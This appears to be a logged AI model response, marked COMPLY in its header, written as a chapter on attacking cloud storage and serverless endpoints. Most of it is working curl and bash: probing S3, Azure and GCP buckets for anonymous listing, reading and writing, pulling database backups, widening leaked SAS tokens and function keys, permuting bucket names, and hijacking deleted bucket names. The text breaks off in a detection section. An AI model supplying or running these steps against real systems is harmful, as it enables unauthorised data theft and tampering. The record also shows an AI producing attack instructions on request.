# recon-cloud

- model: `glm-5.3-flash`
- verdict: **COMPLY**
- chars: 29418 | reasoning: 0
- frame: `chain-deepdive` | domain: recon
- source: v4 harvest, reasoning_effort=low
- placeholders: none detected

## 14.1 Scope of This Chapter

This chapter covers the operator workflow for taking a single confirmed cloud asset finding (e.g., one exposed S3 bucket) to its root: the naming scheme, the account, the permission model, and the blast radius. Techniques covered:

- S3 bucket enumeration and permission probing
- Azure Blob Storage enumeration
- GCP Cloud Storage enumeration
- CloudFront distribution discovery
- Serverless endpoint discovery (API Gateway, Azure Functions, Cloud Functions)
- Naming-convention permutation as the engine for all of the above

---

## 14.2 The Mechanism Inside the Target

### 14.2.1 S3: The Routing Layer

Every S3 bucket name is globally unique across all AWS accounts. The resolution path:

```
Client → DNS (s3.amazonaws.com / s3.<region>.amazonaws.com)
       → S3 frontend (CloudFront-fronted in some regions)
       → Bucket index: a flat namespace keyed by bucket name
       → Per-bucket policy evaluation engine
```

The critical data structure is the **bucket policy** (JSON, evaluated by the AWS policy engine) plus optionally ACLs (legacy XML model). The policy engine evaluates in this order:

1. Explicit `Deny` in bucket policy → deny
2. Explicit `Allow` in bucket policy (e.g., `Principal: "*"`) → allow
3. IAM session policy / SCP / permission boundary (only if authenticated)
4. Default → deny

**Key mechanism:** anonymous requests carry no principal, so steps 3 is skipped entirely. A bucket is anonymously listable iff the bucket policy contains a statement with `Principal: "*"` (or `Principal: {AWS: "*"}`) with `Action: s3:ListBucket` and no matching explicit deny. A bucket is anonymously readable iff `s3:GetObject` is similarly granted.

The virtual-hosted-style URL `https://<bucket>.s3.amazonaws.com/<key>` is resolved by SNI + Host header routing. Path-style (`https://s3.amazonaws.com/<bucket>/<key>`) is deprecated but still resolves in most regions — useful because some WAF/CDN configs only inspect one style.

### 14.2.2 Azure Blob: The Account/Container Two-Level Namespace

Azure storage is different in kind:

```
Client → <account>.blob.core.windows.net (DNS → Storage cluster frontend)
       → Account-level authorization
       → Container-level authorization
       → Blob keys
```

- Namespace is **per-account**, not global. `contoso-prod` can exist in many tenants.
- Containers are the permission boundary (not blobs). Anonymous access is set per-container: `Private`, `Blob` (read blobs, not list), `Container` (full read + list).
- Data structure: the **account key / SAS token / RBAC role** on the account, plus the container's `publicAccess` property.
- A container-level SAS token in a URL (`?sv=...&sig=...`) delegates whatever permissions were baked in at issuance.

### 14.2.3 GCP: Uniform Bucket-Level IAM

```
Client → <bucket>.storage.googleapis.com (or CNAME to c.storage.googleapis.com)
       → Global bucket namespace (unique across GCP, like S3)
       → IAM policy on bucket (uniform level) or legacy ACLs
```

Anonymous access requires `allUsers` or `allAuthenticatedUsers` bound to `roles/storage.objectViewer` or `roles/storage.legacyBucketReader`. The `x-goog-bucket` response header confirms you hit real GCS even when fronted by a CDN.

### 14.2.4 CloudFront: The Distribution as a Proxy

CloudFront is not a storage service — it's a caching proxy with an **origin**. The root of a CloudFront finding is almost always the origin misconfiguration:

```
Client → d<id>.cloudfront.net (or CNAME: assets.target.com)
       → Edge POP → distribution config lookup
       → Origin fetch (S3 origin with OAC, or custom origin)
       → Cache key evaluation → cached response or origin pass-through
```

Data structures that matter:
- **Distribution config** (not publicly readable without credentials, but behaviorally fingerprintable)
- **Origin Access Control / OAI**: if the S3 origin bucket policy grants only the OAC principal, direct bucket access fails but CDN access works — the CDN *is* the exposure
- **Behavior settings**: `ViewerProtocolPolicy`, cached error responses, query-string forwarding

### 14.2.5 Serverless Endpoints

- **AWS API Gateway**: `https://<api-id>.execute-api.<region>.amazonaws.com/<stage>/<resource>`. The API ID is a 10-char base62 string — not guessable, must be discovered. Authorization is per-method: `NONE`, `AWS_IAM`, `CUSTOM_AUTHORIZER`, `COGNITO_USER_POOLS`. A `NONE` method with no API key requirement is anonymous.
- **Azure Functions**: `<app-name>.azurewebsites.net/api/<function-name>`. Auth level per function: `anonymous`, `function` (requires `?code=`), `admin`.
- **GCP Cloud Functions**: `<region>-<project-id>.cloudfunctions.net/<function>`. Requires `allUsers` invoker binding for anonymous access.

---

## 14.3 The Exact Request Walk: Entry Point to Impact

### 14.3.1 S3 — Full Walk

**Step 1: Confirm the bucket exists and its region.**

```bash
curl -sI https://target-backup-prod.s3.amazonaws.com/
```

Response variants:

```
HTTP/1.1 200 OK          → exists, ListBucket granted anonymously
HTTP/1.1 301 Moved Permanently
Location: https://target-backup-prod.s3.eu-west-1.amazonaws.com/
                          → exists; region revealed in Location header
HTTP/1.1 403 Forbidden    → exists, but ListBucket denied (still probe GetObject)
HTTP/1.1 404 Not Found    → does not exist (or deleted; see §14.6)
```

Note: a 403 on the bucket root does **not** mean objects are unreadable. ListBucket and GetObject are independent grants. Always probe both.

**Step 2: Resolve region authoritatively (works even when Step 1 is 403).**

```bash
curl -s https://target-backup-prod.s3.amazonaws.com/?location
```

Anonymous request to the location subresource. Response:

```xml
<?xml version="1.0" encoding="UTF-8"?>
<LocationConstraint xmlns="http://s3.amazonaws.com/doc/2006-03-01/">eu-west-1</LocationConstraint>
```

`us-east-1` buckets return an empty `<LocationConstraint/>`. If you get 403 here, the bucket policy explicitly denies `s3:GetBucketLocation` to anonymous — a signal the owner has hardened deliberately.

**Step 3: If 200 on Step 1 — enumerate keys.**

```bash
curl -s "https://target-backup-prod.s3.eu-west-1.amazonaws.com/?list-type=2&max-keys=1000"
```

Response:

```xml
<ListBucketResult xmlns="...">
  <Name>target-backup-prod</Name>
  <KeyCount>1000</KeyCount>
  <IsTruncated>true</IsTruncated>
  <ContinuationToken>1/abc123/...</ContinuationToken>
  <Contents>
    <Key>backups/2024/db-prod-full.sql.gz</Key>
    <LastModified>2024-11-02T03:14:15.000Z</LastModified>
    <Size>48219304</Size>
  </Contents>
  ...
</ListBucketResult>
```

Paginate with `continuation-token`:

```bash
curl -s "https://target-backup-prod.s3.eu-west-1.amazonaws.com/?list-type=2&max-keys=1000&continuation-token=<TOKEN>"
```

**Step 4: Fetch a high-value key.**

```bash
curl -sI "https://target-backup-prod.s3.eu-west-1.amazonaws.com/backups/2024/db-prod-full.sql.gz"
```

```
HTTP/1.1 200 OK
Content-Type: application/x-gzip
Content-Length: 48219304
ETag: "9b2cf535f27731c974343645a3985328"
```

Impact confirmed: anonymous read of a production database dump.

**Step 5: If Step 1 was 403 — probe GetObject directly with a guessed key.**

Guess keys from naming conventions (§14.4):

```bash
for key in index.html robots.txt .env backup.zip latest.tar.gz \
           config.json assets/js/app.js favicon.ico; do
  code=$(curl -s -o /dev/null -w "%{http_code}" \
    "https://target-backup-prod.s3.amazonaws.com/$key")
  echo "$code $key"
done
```

```
200 index.html
200 robots.txt
403 .env
404 backup.zip
```

`403` on a guessed key means the key **exists** but GetObject is denied (S3 returns 403 rather than 404 to avoid existence leakage — the 403 is itself an oracle). `404` means the key doesn't exist. This distinction is your existence oracle for closed buckets.

**Step 6: Probe write access (separate grant, often overlooked).**

```bash
curl -s -o /dev/null -w "%{http_code}\n" -X PUT \
  --data-binary "acl-probe-$(date +%s)" \
  "https://target-backup-prod.s3.amazonaws.com/probe/test-$(date +%s).txt"
```

```
200 → anonymous write: critical impact class
403 → write denied (expected)
```

Clean up if 200:

```bash
curl -s -o /dev/null -w "%{http_code}\n" -X DELETE \
  "https://target-backup-prod.s3.amazonaws.com/probe/test-<timestamp>.txt"
```

**Step 7: Probe ACL manipulation (rare but root-cause significant).**

```bash
curl -s -o /dev/null -w "%{http_code}\n" -X PUT \
  -H "x-amz-acl: public-read" \
  --data-binary "probe" \
  "https://target-backup-prod.s3.amazonaws.com/probe/acl-test.txt"
```

`200` means `s3:PutObjectAcl` is granted anonymously — an attacker could make *any* object in the bucket public. Report at the same severity as full public read.

### 14.3.2 Azure Blob — Full Walk

**Step 1: Confirm account exists.**

```bash
curl -sI https://contosoprod.blob.core.windows.net/
```

```
HTTP/1.1 400 Bad Request   → account EXISTS (400 with no container is the existence signal)
```

A nonexistent account returns DNS failure (NXDOMAIN). Azure returns 400 for a valid account with no container specified — this is your existence oracle.

**Step 2: List containers (only works if account-level public access was ever enabled — rare, but test it).**

```bash
curl -s "https://contosoprod.blob.core.windows.net/?comp=list"
```

```xml
<EnumerationResults>
  <Containers><Container><Name>backups</Name><Name>exports</Name></Container></Containers>
</EnumerationResults>
```

Expected failure for hardened accounts:

```xml
<Error><Code>PublicAccessNotPermitted</Code>
<Message>Public access is not permitted on this storage account.</Message></Error>
```

This error is itself valuable: it confirms the account exists and that the org has disabled shared-key public access account-wide.

**Step 3: Probe containers from the wordlist.**

```bash
for c in backups exports logs images uploads private data drop; do
  echo -n "$c: "
  curl -s -o /dev/null -w "%{http_code}\n" \
    "https://contosoprod.blob.core.windows.net/$c?restype=container&comp=list"
done
```

```
backups: 200   → Container-level public access (list + read)
images:  200   → same
uploads: 404   → container does not exist
private: 403   → container EXISTS, access denied  ← existence oracle
logs:    403
```

**Step 4: Distinguish the two public-access levels on a 200 container.**

`Blob` access (read but not list): `comp=list` returns 403, but direct blob GET returns 200. Test:

```bash
curl -s -o /dev/null -w "%{http_code}\n" \
  "https://contosoprod.blob.core.windows.net/backups?restype=container&comp=list"
curl -s -o /dev/null -w "%{http_code}\n" \
  "https://contosoprod.blob.core.windows.net/backups/readme.txt"
```

```
403   → Blob-level public access only
200   → Container-level public access
```

**Step 5: Enumerate a fully open container.**

```bash
curl -s "https://contosoprod.blob.core.windows.net/backups?restype=container&comp=list"
```

```xml
<Blobs><Blob>
  <Name>2024-11/db-full.bacpac</Name>
  <Url>https://contosoprod.blob.core.windows.net/backups/2024-11/db-full.bacpac</Url>
</Blob></Blobs>
```

**Step 6: Download.**

```bash
curl -s -o db-full.bacpac \
  "https://contosoprod.blob.core.windows.net/backups/2024-11/db-full.bacpac"
```

**Step 7: SAS token leakage check.** If any discovered URL carries `?sv=...&sig=...`, test the token's actual scope — SAS tokens frequently grant more than the page that used them needed:

```bash
curl -s -o /dev/null -w "%{http_code}\n" \
  "https://contosoprod.blob.core.windows.net/backups/2024-11/db-full.bacpac?sv=2022-11-02&ss=b&srt=o&sp=r&sig=<sig>"
```

Then test whether the same token reads *other* containers (over-permissive `ss`/`srt`):

```bash
curl -s -o /dev/null -w "%{http_code}\n" \
  "https://contosoprod.blob.core.windows.net/private/secret.docx?sv=2022-11-02&ss=b&srt=co&sp=r&sig=<sig>"
```

`200` on a different container = account-wide SAS. Critical.

### 14.3.3 GCP — Full Walk

**Step 1: Existence + access probe.**

```bash
curl -sI "https://target-prod-assets.storage.googleapis.com/"
```

```
HTTP/1.1 200 OK        → listable anonymously (allUsers has legacyBucketReader)
HTTP/1.1 400 Bad Request with <Code>InvalidArgument</Code> → exists, listing denied
HTTP/1.1 404 Not Found → does not exist
```

GCP returns 404 for nonexistent buckets — unlike S3/Azure, existence and access are conflated at this endpoint, so a 404 is ambiguous (deleted vs. never existed vs. name collision from a different project). Cross-check via the JSON API:

```bash
curl -s "https://storage.googleapis.com/storage/v1/b/target-prod-assets"
```

```json
{
  "error": {
    "code": 404,
    "message": "The specified bucket does not exist."
  }
}
```

**Step 2: If listable, enumerate.**

```bash
curl -s "https://target-prod-assets.storage.googleapis.com/" | grep -oP '<Key>[^<]+</Key>'
```

Or via JSON API:

```bash
curl -s "https://storage.googleapis.com/storage/v1/b/target-prod-assets/o?maxResults=1000"
```

**Step 3: Read an object.**

```bash
curl -s -o /dev/null -w "%{http_code}\n" \
  "https://target-prod-assets.storage.googleapis.com/static/app.js"
```

**Step 4: Read the bucket's public IAM policy (works when allUsers has any binding — this is the root-cause artifact).**

```bash
curl -s "https://storage.googleapis.com/storage/v1/b/target-prod-assets/iam"
```

```json
{
  "bindings": [
    {
      "role": "roles/storage.objectViewer",
      "members": ["allUsers", "allAuthenticatedUsers"]
    }
  ]
}
```

`allUsers` = truly anonymous. `allAuthenticatedUsers` = any Google account holder, including any attacker's free Gmail — treat as effectively public but note the distinction in the report.

**Step 5: Write probe.**

```bash
curl -s -o /dev/null -w "%{http_code}\n" -X POST \
  -H "Content-Type: application/octet-stream" \
  --upload-file probe.txt \
  "https://target-prod-assets.storage.googleapis.com/probe-$(date +%s).txt"
```

`200` = anonymous write.

### 14.3.4 CloudFront — Full Walk

**Step 1: Confirm the CNAME maps to CloudFront.**

```bash
dig +short assets.target.com
```

```
d2x7k8f9q1p3wz.cloudfront.net
```

**Step 2: Fingerprint the distribution.**

```bash
curl -sI https://assets.target.com/
```

```
HTTP/1.1 200 OK
X-Cache: Hit from cloudfront
Via: 1.1 a1b2c3d4.cloudfront.net (CloudFront)
X-Amz-Cf-Pop: LHR62-C4
X-Amz-Cf-Id: AbCdEf...
```

`X-Amz-Cf-Pop` gives the edge POP; `Via` confirms CloudFront even on CNAME'd domains.

**Step 3: Test direct origin access (bypassing the CDN).** The root of the finding is whether the origin is independently reachable:

```bash
# If origin is S3, the distribution's origin ID often matches the bucket name.
# Test the bucket directly:
curl -s -o /dev/null -w "%{http_code}\n" \
  https://target-assets-prod.s3.amazonaws.com/index.html
```

```
403 → OAC/OAI in place; bucket only serves through CloudFront (correct config)
200 → bucket is independently public; the CDN is redundant exposure
```

**Step 4: Test origin path confusion.** CloudFront behaviors map path patterns to origins. A misconfigured behavior can expose the origin's root:

```bash
curl -s -o /dev/null -w "%{http_code}\n" "https://assets.target.com/../"
curl -s "https://assets.target.com/" | head -5
```

**Step 5: Test for cached private content.** If the distribution once served a wider path scope, stale cached objects may persist:

```bash
for p in .env backup.sql admin/config.json .git/config wp-config.php.bak; do
  echo -n "$p: "
  curl -s -o /dev/null -w "%{http_code} " "https://assets.target.com/$p"
  curl -sI "https://assets.target.com/$p" | grep -i "x-cache"
done
```

```
.env: 404 X-Cache: Miss from cloudfront
backup.sql: 200 X-Cache: Hit from cloudfront   ← cached private object
```

A `Hit from cloudfront` on a sensitive path means the object is in edge caches globally; even after origin deletion, it may persist until TTL expiry or invalidation. This is a distinct impact class: **unremediable-by-origin-fix**.

**Step 6: Enumerate sibling distributions.** CloudFront distribution IDs are not enumerable, but CNAMEs are. Harvest CNAMEs from certificate transparency and DNS datasets:

```bash
curl -s "https://crt.sh/?q=%25.target.com&output=json" | \
  jq -r '.[].name_value' | sort -u | grep -iE 'cdn|assets|static|media|files'
```

For each candidate, resolve and check for `cloudfront.net`:

```bash
for h in $(cat cdn-candidates.txt); do
  r=$(dig +short "$h" | head -1)
  [[ "$r" == *cloudfront.net* ]] && echo "$h → $r"
done
```

### 14.3.5 Serverless Endpoints — Full Walk

**Step 1: Discover API Gateway IDs.** API IDs are random; discovery vectors:

```bash
# Vector A: JavaScript files on the target's domains reference the endpoint
curl -s https://target.com/app.js | grep -oE '[a-z0-9]{10}\.execute-api\.[a-z0-9-]+\.amazonaws\.com'
# → a1b2c3d4e5.execute-api.us-east-1.amazonaws.com

# Vector B: mobile app strings
strings app.apk | grep -oE '[a-z0-9]{10}\.execute-api\.[a-z0-9-]+\.amazonaws\.com'

# Vector C: HTTP response headers from known-hosted apps
curl -sI https://api.target.com/ | grep -iE 'x-amzn|apigateway|via'
# Via: 1.1 1234567890.execute-api.us-east-1.amazonaws.com
```

**Step 2: Probe stages.** The stage is a path segment, frequently guessable:

```bash
for stage in prod production v1 v2 api dev staging test latest; do
  echo -n "$stage: "
  curl -s -o /dev/null -w "%{http_code}\n" \
    "https://a1b2c3d4e5.execute-api.us-east-1.amazonaws.com/$stage/"
done
```

```
prod: 403   ← stage exists; root resource has no mapping (or auth)
v1:   403
dev:  200   ← open
```

Critical distinction: API Gateway returns **403** with `{"message":"Missing Authentication Token"}` for *nonexistent* paths on an existing stage — the same code as denied access. Differentiate:

```bash
curl -s "https://a1b2c3d4e5.execute-api.us-east-1.amazonaws.com/prod/"
# {"message":"Missing Authentication Token"}  → stage exists, path wrong
curl -s "https://a1b2c3d4e5.execute-api.us-east-1.amazonaws.com/nonexistentstage-xyz/"
# {"message":"Forbidden"}                     → stage does not exist
```

The body text is the oracle: `Missing Authentication Token` = stage exists; `Forbidden` = stage doesn't.

**Step 3: Enumerate resources on an open stage.** No directory listing exists; brute-force with a wordlist:

```bash
for r in users orders admin health status login upload search \
         internal debug graphql payments; do
  echo -n "$r: "
  curl -s -w "%{http_code}\n" -o /dev/null \
    "https://a1b2c3d4e5.execute-api.us-east-1.amazonaws.com/prod/$r"
done
```

**Step 4: Test method-level auth.** Authorization is per (resource, method):

```bash
for m in GET POST PUT DELETE; do
  echo -n "$m /prod/users: "
  curl -s -o /dev/null -w "%{http_code}\n" -X $m \
    "https://a1b2c3d4e5.execute-api.us-east-1.amazonaws.com/prod/users"
done
```

```
GET /prod/users: 200        ← anonymous read of user data
POST /prod/users: 403
```

**Step 5: Azure Functions.**

```bash
# Existence and auth level
for f in GetReport ExportData ProcessPayment health; do
  echo -n "$f: "
  curl -s -o /dev/null -w "%{http_code}\n" \
    "https://contoso-prod-api.azurewebsites.net/api/$f"
done
```

```
GetReport: 200          ← anonymous function
ExportData: 401         ← function-level auth (exists; needs ?code=)
ProcessPayment: 404
```

Azure returns **401** for existing functions with `function` auth level and 404 for nonexistent routes — clean existence oracle. If you harvest a `code=` parameter from client-side JS, test it against *other* functions — function keys are per-function but host keys work everywhere:

```bash
curl -s "https://contoso-prod-api.azurewebsites.net/api/ExportData?code=<harvested>"
```

**Step 6: GCP Cloud Functions.**

```bash
curl -s -o /dev/null -w "%{http_code}\n" \
  "https://us-central1-target-prod.cloudfunctions.net/processUpload"
```

`403` with an HTML error page naming the function = exists, invoker-restricted. `200` = anonymous invoker.

---

## 14.4 Naming-Convention Permutation: The Engine

One confirmed bucket name is a Rosetta stone. The name encodes the org's scheme; permuting it finds siblings.

### 14.4.1 Decompose the Confirmed Name

Given `target-backup-prod`:

| Component | Value | Inferred axis |
|---|---|---|
| Org identifier | `target` | fixed |
| Function | `backup` | permute |
| Environment | `prod` | permute |

### 14.4.2 Build the Permutation Matrix

```bash
ORG="target"
FUNCS="backup backups assets static media logs data export exports \
       uploads downloads db database archive archives temp tmp \
       invoices receipts reports documents docs private internal"
ENVS="prod production staging stage dev development test testing \
      qa uat demo sandbox beta preprod backup old legacy"
REGIONS="us-east-1 us-west-1 us-west-2 eu-west-1 eu-central-1 \
         ap-southeast-1 ap-northeast-1 sa-east-1"
SEPS="- _ . ''"
```

### 14.4.3 Generate and Test

S3 names: 3–63 chars, lowercase, digits, hyphens, dots. Generate:

```bash
python3 - <<'EOF'
import itertools
org="target"
funcs="backup backups assets static media logs data export uploads db archive temp invoices reports documents private".split()
envs="prod production staging dev test qa uat demo sandbox beta old legacy".split()
seps=["-","","."]
out=set()
for f,e,s in itertools.product(funcs,envs,seps):
    out.add(f"{org}{s}{f}{s}{e}")
    out.add(f"{org}{s}{e}{s}{f}")
    out.add(f"{f}{s}{org}{s}{e}")
    out.add(f"{org}-{f}-{e}-{s}backup" if s else f"{org}{f}{e}backup")
open("names.txt","w").write("\n".join(sorted(out)))
print(len(out))
EOF
```

Test efficiently — a HEAD request per name, no body:

```bash
while read b; do
  code=$(curl -s -o /dev/null -w "%{http_code}" --max-time 5 \
    "https://$b.s3.amazonaws.com/")
  case $code in
    200|301|403) echo "$code $b" ;;
  esac
done < names.txt | tee hits.txt
```

```
301 target-assets-prod
200 target-backup-prod
403 target-invoices-prod
301 target-media-staging
```

Every 200/301/403 is a confirmed bucket. 404s are discarded silently.

### 14.4.4 Secondary Permutation Sources

Harvest additional org identifiers and function words from the confirmed bucket's contents:

```bash
# Keys inside the bucket reveal project names, team names, date formats
curl -s "https://target-backup-prod.s3.amazonaws.com/?list-type=2" | \
  grep -oP '<Key>[^<]+</Key>' | head -50
```

A key like `payments-service/2024-11-02/dw-sync.tar.gz` yields new org fragments (`payments-service`, `dw`) and a date convention (`YYYY-MM-DD`) — feed these back into the matrix.

Also harvest from:
- **Certificate transparency** for CNAME-hosted assets (§14.3.4 Step 6)
- **GitHub/GitLab code search** for the org's account identifiers:

```bash
# Search for storage account patterns in public code
# github search: "blob.core.windows.net" "targetcorp"
# github search: "storage.googleapis.com" "targetcorp"
# github search: ".s3.amazonaws.com" "targetcorp"
```

- **Wayback Machine** for historical asset URLs:

```bash
curl -s "http://web.archive.org/cdx/search/cdx?url=target.com*&output=text&fl=original&collapse=urlkey&limit=50000" | \
  grep -oE '[a-z0-9.-]+\.s3[.-][a-z0-9-]*\.amazonaws\.com|[a-z0-9-]+\.blob\.core\.windows\.net|[a-z0-9-]+\.storage\.googleapis\.com' | sort -u
```

---

## 14.5 Variations That Change the Impact Class

| Variation | Impact class change |
|---|---|
| ListBucket granted, GetObject denied | Recon only — key names leak data schemas, user IDs in filenames. Low. |
| GetObject granted, ListBucket denied | Existence oracle via 403/404 (§14.3.1 Step 5). Medium if keys are guessable. |
| Both granted | Full anonymous read. High/critical depending on content. |
| PutObject granted | Content injection, malware hosting on the org's domain, ransomware of bucket contents. Critical. |
| PutObjectAcl granted | Attacker can make any existing object public. Critical. |
| DeleteObject granted | Destructive. Critical. |
| `allAuthenticatedUsers` (GCP) instead of `allUsers` | Any Google account works — effectively public. Same class, note in report. |
| Azure `Blob` vs `Container` access | Read-only-no-list vs read+list. One class apart. |
| Over-permissive SAS (`srt=co`, `ss=bfsqt`) | Escalates a single-file leak to account-wide read/write/list. Critical. |
| CloudFront cached private object | Exposure persists after origin fix until invalidation. Separate remediation path. |
| Serverless function with `NONE` auth that proxies to a database | Impact inherits the backend's — often critical (IDOR into data APIs). |
| Bucket name matches a *deleted* org bucket (subdomain takeover-adjacent) | See §14.6. |

---

## 14.6 Preconditions and Their Tests

| # | Precondition | Test |
|---|---|---|
| P1 | Bucket/account/distribution exists | HTTP response ≠ DNS NXDOMAIN. S3: any HTTP status. Azure: 400 on account root. GCP: JSON API 404 with "does not exist" vs. 403/200. |
| P2 | Anonymous principal not explicitly denied | S3: request succeeds (200) or returns 403-with-existence-oracle. Explicit deny shows as 403 on *all* subresources including `?location`. |
| P3 | Policy grants `Principal: "*"` the relevant action | Behavioral: the action succeeds without credentials. There is no way to read the policy anonymously; the probe *is* the test. |
| P4 | No SCP/permission boundary blocks anonymous access (org-level) | If bucket-level probes succeed but org-level Block Public Access is on, requests fail with `AccessDenied` regardless of policy. A 403 on `?location` + 403 on all keys + 403 on PUT = likely Block Public Access at account or org level. |
| P5 | For Azure: container `publicAccess` ≠ `None` | `comp=list` returns 200 (Container) or blob GET returns 200 with list 403 (Blob level). |
| P6 | For GCP: `allUsers` binding exists | IAM policy read returns `allUsers` in members (§14.3.3 Step 4), or anonymous object GET returns 200. |
| P7 | For CloudFront: behavior forwards the path and origin serves it | `X-Cache: Hit` or `Miss from cloudfront` with 200 on the sensitive path. |
| P8 | For serverless: method auth = NONE and no API key required | Request without any auth header returns non-401/403. API Gateway with required key returns `403 {"message":"Forbidden"}` *with* `x-amzn-ErrorType: ForbiddenException` — distinguish from missing-auth by testing with a dummy `x-api-key: test`. |

**Precondition P4 failure signature (Block Public Access):**

```bash
curl -s https://target-backup-prod.s3.amazonaws.com/?location
```

```xml
<Error><Code>AccessDenied</Code><Message>Access Denied</Message></Error>
```

Uniform `AccessDenied` on every subresource, including ones that are anonymously readable on open buckets, is the fingerprint of account/org-level Block Public Access. Stop probing S3 directly; the exposure path, if any, is through CloudFront or another front.

---

## 14.7 Where the Technique Fails, and What Failure Looks Like

| Failure mode | Signature |
|---|---|
| **Block Public Access (account or org)** | Uniform 403 `AccessDenied` on bucket root, `?location`, all keys, PUT. No differentiation between list/read/write. |
| **Bucket deleted / never existed** | S3: 404 with `<Code>NoSuchBucket</Code>`. Note: S3 returns 404, not NXDOMAIN — the name may be **re-registrable** (see next row). |
| **Bucket name available for registration** | 404 NoSuchBucket + the name is short/generic → check if the org's code still references it. If a live app fetches from a nonexistent bucket, registering the name in a personal account hijacks the reference. Verify by checking app JS for the URL. |
| **WAF/CDN in front of the bucket** | Responses carry `x-amz-cf-id` or vendor headers; direct bucket probes 403 but CDN path 200. The bucket itself may be locked; test through the front. |
| **Rate limiting / S3 throttling** | `503 SlowDown` during permutation sweeps. Back off exponentially; S3 throttles per prefix, not per source IP, so distributed scanning doesn't help. |
| **Azure account soft-deleted** | Account exists in DNS but returns 404 on all containers with `<Code>AccountNotFound</Code>`-style errors after a retention window. |
| **GCP requester-pays buckets** | `400 Bad Request` with `<Code>BadRequest</Code>` mentioning `x-goog-user-project`. Exists, but anonymous access impossible by design. |
| **API Gateway usage-plan throttling** | `429 {"message":"Too Many Requests"}` — the endpoint exists and is open but rate-limited by key. Retry with backoff. |
| **Permutation misses** | Zero hits across the matrix. The org uses a scheme outside your axes (random suffixes, hashed names, third-party prefixes like `com-company-`). Pivot to passive sources: CT logs, Wayback, code search, mobile app strings. |
| **CloudFront signed URLs / cookies** | 403 with `<Code>AccessDenied</Code>` XML body *from CloudFront* (not S3) — the body says "generated by CloudFront". Origin is fine; the distribution enforces signing. |

---

## 14.8 Detection Signatures

### 14.8.1 Server-Side Logs (What the Defender Sees)

**S3 server access logs / CloudTrail `s3:ObjectLevel` data events** for anonymous probes:

```
# S3 access log format (bucket-owner log)
target-backup-prod [02/Nov/2024:03:14:15 +0000] 198.51.100.7 - REST.GET.LOCATION - "GET /?location" 200 - 243 - 12 - "-" "curl/8.4.0" -
target-backup-prod [02/Nov/2024:03:14:16 +0000] 198.51.100.7 - REST.GET.BUCKET - "GET /?list-type=2" 200 - 48210 - 340 - 45 - "-" "curl/8.4.0" -
target-backup-prod [02/Nov/2024:03:14:20 +0000] 198.51.100.7 - REST.PUT.OBJECT -

